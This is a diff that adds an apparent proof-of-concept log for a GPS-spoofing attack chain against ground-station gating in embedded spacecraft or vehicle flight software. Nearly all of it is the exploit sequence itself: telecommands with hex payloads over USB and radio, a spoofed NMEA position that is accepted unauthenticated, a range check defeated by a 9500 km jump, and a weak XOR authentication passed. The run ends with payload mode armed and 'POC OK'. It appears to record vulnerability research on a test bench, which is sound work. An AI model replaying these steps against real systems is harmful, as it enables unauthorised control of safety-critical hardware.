@@ -1,0 +1,94 @@
+[   0.000] ========================================================================
+[   0.000] V-36 GPS spoof -> GS gate bypass chain
+[   0.000] ========================================================================
+[   1.519] --> HARD RESET (bench parity: fresh board per PoC)
+[   8.856] --> TC apid=0x0A via=usb AES  payload=00
+[   8.907] <-- TM apid=0x0A clear len=3
+[   8.949] --> TC apid=0x1D via=usb clear payload=0101
+[   9.000] <-- TM apid=0x1D clear len=4
+[   9.000] --> TC apid=0x11 via=usb clear payload=00
+[   9.460] <-- TM apid=0x11 clear len=9
+[   9.460] --> TC apid=0x15 via=usb clear payload=001005
+[   9.910] <-- TM apid=0x15 clear len=6
+[   9.910] --> TC apid=0x0D via=usb clear payload=01
+[  10.371] <-- TM apid=0x0D clear len=4
+[  10.412] --> TC apid=0x1D via=usb clear payload=03
+[  10.464] <-- TM apid=0x1D clear len=4
+[  10.464] <-- TM apid=0x09 clear len=9
+[  10.515] --> TC apid=0x1D via=usb clear payload=0a0258
+[  10.566] <-- TM apid=0x1D clear len=4
+[  10.567] --> TC apid=0x10 via=usb clear payload=00
+[  10.608] <-- TM apid=0x10 clear len=4
+[  10.608] --> TC apid=0x21 via=usb clear payload=00
+[  11.067] <-- TM apid=0x21 clear len=6
+[  11.067] --> TC apid=0x24 via=usb clear payload=0000
+[  11.119] <-- TM apid=0x24 clear len=8
+[  11.119] --> TC apid=0x24 via=usb clear payload=0100
+[  11.160] <-- TM apid=0x24 clear len=8
+[  11.160] --> TC apid=0x24 via=usb clear payload=0200
+[  11.212] <-- TM apid=0x24 clear len=8
+[  11.212] --> TC apid=0x24 via=usb clear payload=0300
+[  11.264] <-- TM apid=0x24 clear len=8
+[  11.264] --> TC apid=0x25 via=usb clear payload=0080
+[  11.315] <-- TM apid=0x25 clear len=4
+[  11.316] --> TC apid=0x1E via=usb clear payload=01
+[  11.828] <-- TM apid=0x1E clear len=5
+[  11.828] --> TC apid=0x1D via=usb clear payload=0b
+[  11.921] <-- TM apid=0x1D clear len=4
+[  11.921] --> TC apid=0x05 via=usb clear payload=12
+[  12.371] --> TC apid=0x1F via=usb clear payload=0600000000000000000000000700
+[  12.883] <-- TM apid=0x1F clear len=4
+[  12.883] --> TC apid=0x1F via=usb clear payload=05
+[  13.386] <-- TM apid=0x1F clear len=4
+[  13.386] --> TC apid=0x0A via=usb clear payload=01
+[  13.430] <-- TM apid=0x0A AES len=3
+[  21.526] --> TC apid=0x14 via=usb AES  payload=406c841500e055bb801a060008
+[  29.996] <-- TM apid=0x0E AES len=18
+[  29.996] --> REARM (bench parity: fresh board, pre-PoC)
+[  30.069] --> TC apid=0x14 via=radio AES  payload=00564415a0004353801a060009
+[  38.552] <-- TM apid=0x0E AES len=18
+[  38.552] spoofed fix: Tokyo (lat_e7=356800000) accepted without any checksum or source authentication
+[  38.552] --> TC apid=0x11 via=radio AES  payload=01
+[  39.024] <-- TM apid=0x09 AES len=14
+[  39.025] <-- TM apid=0x11 AES len=9
+[  39.025] GS_MODE(ON) -> 'GS RANGE LOCK': the arming itself is range-gated
+[  39.025] --> TC apid=0x25 via=usb AES  payload=0090
+[  39.067] <-- TM apid=0x25 clear len=4
+[  39.067] --> TC apid=0x14 via=radio AES  payload=406c841500e055bb801a060009
+[  47.549] <-- TM apid=0x0E AES len=18
+[  47.570] with plausibility gate: reject counter=1 (position held in Tokyo)
+[  47.570] --> advance(60000 ms)
+[ 107.632] <-- TM apid=0x27 clear len=4
+[ 107.635] <-- TM apid=0x08 AES len=20
+[ 107.636] <-- TM apid=0x01 AES len=8
+[ 107.637] <-- TM apid=0x0E AES len=30
+[ 107.638] <-- TM apid=0x08 AES len=20
+[ 107.638] <-- TM apid=0x3FF AES len=14
+[ 107.638] <-- TM apid=0x01 AES len=8
+[ 107.639] <-- TM apid=0x08 AES len=20
+[ 107.639] <-- TM apid=0x0E AES len=30
+[ 107.640] <-- TM apid=0x08 AES len=20
+[ 107.640] --> TC apid=0x14 via=radio AES  payload=b8168f15900f5fbb801a060009
+[ 116.116] <-- TM apid=0x0E AES len=18
+[ 116.117] --> TC apid=0x13 via=usb AES  payload=-
+[ 116.556] <-- TM apid=0x13 AES len=23
+[ 116.556] 9500 km in 60 s accepted -> vehicle back inside the footprint (GS range field now 0 m)
+[ 116.556] --> TC apid=0x13 via=usb AES  payload=-
+[ 117.017] <-- TM apid=0x13 AES len=23
+[ 117.017] --> TC apid=0x11 via=radio AES  payload=01
+[ 117.466] <-- TM apid=0x11 AES len=9
+[ 117.467] --> TC apid=0x0C via=radio AES  payload=-
+[ 117.917] <-- TM apid=0x09 AES len=17
+[ 117.919] <-- TM apid=0x13 AES len=23
+[ 117.919] GS AUTH REQUIRED on a plain GET_STATUS -> session needed
+[ 117.919] --> TC apid=0x12 via=radio AES  payload=00
+[ 119.527] <-- TM apid=0x12 AES len=13
+[ 119.527] --> TC apid=0x12 via=radio AES  payload=01f2862004
+[ 119.975] <-- TM apid=0x12 AES len=13
+[ 119.975] --> TC apid=0x0D via=radio AES  payload=02
+[ 120.435] <-- TM apid=0x0D AES len=4
+[ 120.435] chain complete: NMEA spoof -> range dissolved -> XOR auth -> PAYLOAD mode armed, all from an unauthenticated uplink
+[ 120.435] -- console tail: [TC - SPP] APID=0x027 SEQ=1 LEN=29 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x011 SEQ=1 LEN=16 FLAGS=1 SEC_HDR=NO | [INFO] Ground station communication mode enabled | [TC - SPP] APID=0x027 SEQ=1 LEN=29 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x00C SEQ=1 LEN=16 FLAGS=1 SEC_HDR=NO | [WARN] Ground station gate rejected APID 0x00C: GS AUTH REQUIRED | [TC - SPP] APID=0x027 SEQ=1 LEN=29 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x012 SEQ=1 LEN=16 FLAGS=1 SEC_HDR=NO | [INFO] Ground station challenge issued: 0x3258DACA | [TC - SPP] APID=0x027 SEQ=1 LEN=29 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x012 SEQ=1 LEN=16 FLAGS=1 SEC_HDR=NO | [INFO] Ground station handshake accepted | [TC - SPP] APID=0x027 SEQ=1 LEN=29 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x00D SEQ=1 LEN=16 FLAGS=1 SEC_HDR=NO
+[ 120.435] ========================================================================
+[ 120.435] POC OK
+[ 120.435] ========================================================================
